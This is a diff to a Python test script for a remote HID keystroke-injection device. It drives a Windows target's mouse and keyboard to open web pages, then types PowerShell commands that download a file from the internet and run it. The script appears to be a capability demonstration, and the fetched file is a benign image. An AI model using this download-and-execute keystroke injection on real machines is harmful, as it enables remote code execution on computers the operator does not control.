@@ -1,5 +1,6 @@
 import sys
-import airhid_remote as remote
+from airhid_driver import AirHidDriver as driver
+from time import sleep
 
 IP = "192.168.107.129"
 PORT = 13246
@@ -21,15 +22,44 @@ def main():
     else:
         ip = IP
 
-    r = remote.AirHID_Remote(ip, PORT)
-    test_open_start_menu(r)
-    test_open_url(r)
+    r = driver(ip, PORT)
 
-def test_open_start_menu(r):
-    r.move_mouse(-2000,2000).left_click()
+    tests = [test_open_url,
+             test_powershell]
 
+    for run in tests:
+        clean_environment(r)
+        run(r)
+        sleep(3)
+
+def clean_environment(r):
+    r.move_mouse(-2000,-2000)
+
+"""
+Demonstrates that we can both open an arbitrary page in the default browser and
+use the browser itself by navigating to another page. F4 shortcut is IE-specific.
+"""
 def test_open_url(r):
     r.open_url("http://www.yahoo.com/")
+    sleep(1)
+    r.press_action_key("TAB", shift=True)
+    sleep(4)
+    r.press_action_key("F4")
+    sleep(0.2)
+    r.type("www.google.com\n")
+
+"""
+Demonstrates that we can download an arbitrary file from the Internet and
+execute it.
+"""
+def test_powershell(r):
+    r.move_mouse(-2000,2000).left_click()
+    sleep(0.5)
+    r.type('powershell\n')
+    sleep(4)
+    r.type('$c = new-object System.Net.WebClient\n') \
+     .type('$c.DownloadFile("http://mit.edu/img/BackImage.jpg","Desktop\\BackImage.jpg")\n') \
+     .type('.\\Desktop\\BackImage.jpg\n')
 
 if __name__ == "__main__":
     main()
